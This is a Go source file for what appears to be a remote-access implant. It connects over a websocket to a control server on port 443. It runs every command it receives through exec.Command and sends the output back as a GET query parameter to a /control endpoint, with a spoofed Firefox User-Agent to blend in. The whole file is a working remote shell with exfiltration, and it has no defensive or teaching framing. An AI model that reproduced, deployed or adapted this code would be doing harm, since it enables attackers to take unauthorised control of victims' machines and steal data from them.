package main

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	socketUrl = "ws://0.0.0.0:443" + "/"
	webUrl    = "http://0.0.0.0:443" + "/control"

	receive = make(chan string)
	send    = make(chan string)
	done    = make(chan struct{})

	// colors
	green = color.Green
	red   = color.Red
	bold  = color.New(color.Bold).SprintFunc()
)

func main() {
	//interrupt := make(chan os.Signal, 1)
	//signal.Notify(interrupt, os.Interrupt)

	time.Sleep(1 * time.Second)
	conn, _, err := websocket.DefaultDialer.Dial(socketUrl, nil)
	if err != nil {
		red(bold("Error: " + err.Error()))
		os.Exit(1)
	}
	defer conn.Close()

	go receiveMessage(conn)

	for {
		select {
		case this := <-send:
			sendMessage(conn, this)
		case this := <-receive:
			log.Printf("recv: %s", this)
			stdout := execute(this)
			get(webUrl, stdout)
			//sendMessage(conn, stdout)
		case <-done:
			//interrupt(conn)
			return
		}
	}

}

// function to sendMessage to server
func sendMessage(conn *websocket.Conn, message string) {
	err := conn.WriteMessage(websocket.TextMessage, []byte(message))
	if err != nil {
		red(bold("Error: " + err.Error()))
		return
	}
}

// function to receiveMessage from server
func receiveMessage(conn *websocket.Conn) {
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			red(bold("Error: " + err.Error()))
			return
		}
		receive <- string(message)
	}
}

// function to execute command
func execute(command string) string {
	args := strings.Split(command, " ")[1:]

	out, err := exec.Command(strings.Split(command, " ")[0], args...).Output()
	if err != nil {
		fmt.Printf("%s", err)
	}

	//fmt.Println("Command Successfully Executed")
	return string(out[:])
}

func get(url string, data string) {
	client := &http.Client{}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		red(bold("Error: " + err.Error()))
	}

	q := req.URL.Query()
	q.Add("out", data)
	req.URL.RawQuery = q.Encode()

	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0")

	resp, err := client.Do(req)
	if err != nil {
		red(bold("Error: " + err.Error()))
	}

	if resp.StatusCode == http.StatusOK {
		green(bold("Success: " + resp.Status))
	}
}
